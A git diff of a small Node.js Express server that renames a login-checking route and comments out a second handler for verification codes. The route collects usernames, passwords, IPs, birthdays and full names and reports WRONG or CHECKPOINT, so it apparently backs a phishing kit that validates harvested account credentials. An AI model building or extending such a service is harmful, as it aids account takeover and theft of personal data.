@@ -22,7 +22,7 @@ app.get('/', (res) => {
 app.get('/admin', (req, res) => {
    res.sendFile(path.join(adminPath, 'index.html'));
 });
-app.post('/checka', async (req, res) => {
+app.post('/check', async (req, res) => {
     const { username, password, ip, country, fullname, birthday } = req.body;
     try {
         await initialize();
@@ -40,7 +40,7 @@ app.post('/checka', async (req, res) => {
             //   .catch(error => {
             //     console.error('Có lỗi xảy ra khi gửi tin nhắn', error);
             //   });
-            res.send('WRONGs');
+            res.send('WRONG');
         }
         else if (result === 'CHECKPOINT') {
             res.send('CHECKPOINT');
@@ -91,21 +91,20 @@ app.post('/update', (req, res) => {
 server.listen(port, () => {
     console.log(`http://localhost:${port}`);
 });
-app.post('/check', async (req, res) => {
-    await initialize();
-    const { code } = req.body;
-    try {
-        const result = await test(code);
-        if (result === 'SUCCESS') {
-            await updateAndSync();
-            await close();
-            res.send('SUCCESS');
-        }
-        else {
-            res.send(result);
-        }
-    } catch (error) {
-        await close();
-        res.status(500).send(error);
-    }
-});
+// app.post('/check', async (req, res) => {
+//     await initialize();
+   
+//     try {
+//         const result = await test();
+//         if (result === 'SUCCESS') {
+            
+//             res.send('SUCCESS');
+//         }
+//         else {
+//             res.send(result);
+//         }
+//     } catch (error) {
+//         await close();
+//         res.status(500).send("loi");
+//     }
+// });
